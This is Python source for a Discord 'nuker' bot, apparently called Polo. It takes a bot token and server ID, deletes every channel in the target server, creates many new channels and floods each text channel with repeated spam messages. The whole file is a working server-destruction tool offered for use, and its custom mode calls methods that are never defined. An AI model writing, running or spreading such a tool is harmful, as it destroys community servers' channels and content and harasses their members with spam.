import discord
import json
import asyncio
from utils.init import *

def loadconfig():
    with open("config.json") as f:
        return json.load(f)

cfg = loadconfig()
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True

class ServerBot(discord.Client):
    def __init__(self, cfg, mode="preset", *args, **kwargs):
        super().__init__(intents=intents, *args, **kwargs)
        self.cfg = cfg
        self.mode = mode

    async def on_ready(self):
        if self.mode == "preset":
            await self.rpreset()
        elif self.mode == "custom":
            await self.rcustom()
        else:
            print(f"{r}[{lr}!{r}] {w}Invalid Choice")
            time.sleep(2)
            os.system('python polo.py')

    async def rpreset(self):
        guild = self.get_guild(int(self.cfg["server_id"]))
        await self.delchnls(guild)
        await self.makechnl(guild, self.cfg["channel_name"], self.cfg["channel_count"])
        await self.spammsg(guild)

    async def rcustom(self):
        self.cfg["channel_name"] = input(f"                                             {ldb}[{lc}Polo{ldb}] {s}| {ldb}[{lc}Channel Name{ldb}]{lc} → ")
        self.cfg["channel_count"] = int(input(f"                                             {ldb}[{lc}Polo{ldb}] {s}| {ldb}[{lc}Channel Amount{ldb}]{lc} → "))
        self.cfg["message"] = input(f"                                             {ldb}[{lc}Polo{ldb}] {s}| {ldb}[{lc}Message{ldb}]{lc} → ")
        self.cfg["message_count"] = int(input(f"                                             {ldb}[{lc}Polo{ldb}] {s}| {ldb}[{lc}Message Amount{ldb}]{lc} → "))
        guild = self.get_guild(int(self.cfg["server_id"]))
        await self.del_channels(guild)
        await self.make_channels(guild, self.cfg["channel_name"], self.cfg["channel_count"])
        await self.spammsg(guild)

    async def delchnls(self, guild):
        for ch in guild.channels:
            try:
                await ch.delete()
                print(f"                                                {ldb}[{s}{crtime}{ldb}] {s}| {lg}Deleted Succesfully")
            except Exception as e:
                print(f"                                                {ldb}[{s}{crtime}{ldb}] {s}| {r}Failed")

    async def makechnl(self, guild, name, count):
        for _ in range(count):
            try:
                await guild.create_text_channel(name)
                print(f"                                                {ldb}[{s}{crtime}{ldb}] {s}| {lg}Created Successfully")
            except Exception as e:
                print(f"                                                {ldb}[{s}{crtime}{ldb}] {s}| {r}Failed")

    async def spammsg(self, guild):
        tasks = []
        for ch in guild.text_channels:
            tasks.append(self.sendmsg(ch))
        await asyncio.gather(*tasks)

    async def sendmsg(self, ch):
        for _ in range(self.cfg["message_count"]):
            try:
                await ch.send(self.cfg["message"])
                print(f"                                                {ldb}[{s}{crtime}{ldb}] {s}| {lg}Sent Successfully")
            except Exception as e:
                print(f"                                                {ldb}[{s}{crtime}{ldb}] {s}| {r}Failed")
async def nuke():
    clear()
    logo()
    bot_token = input(f"                                             {ldb}[{lc}Polo{ldb}] {s}| {ldb}[{lc}Bot Token{ldb}]{lc} → ")
    server_id = input(f"                                             {ldb}[{lc}Polo{ldb}] {s}| {ldb}[{lc}Guild Id{ldb}]{lc} → ")
    cfg["bot_token"] = bot_token
    cfg["server_id"] = server_id
    clear()
    logo()
    mode_type = input(f"""                           {w}Type {ldb}[{lc}Preset{ldb}] {w}for default preset or {ldb}[{lc}Custom{ldb}] {w}for custom preset
                      
                           {ldb}[{lc}POLO{ldb}] {s}| {ldb}[{lc}INPUT{ldb}] {lc}→ """).strip().lower()
    bot = ServerBot(cfg, mode=mode_type)
    await bot.start(bot_token)
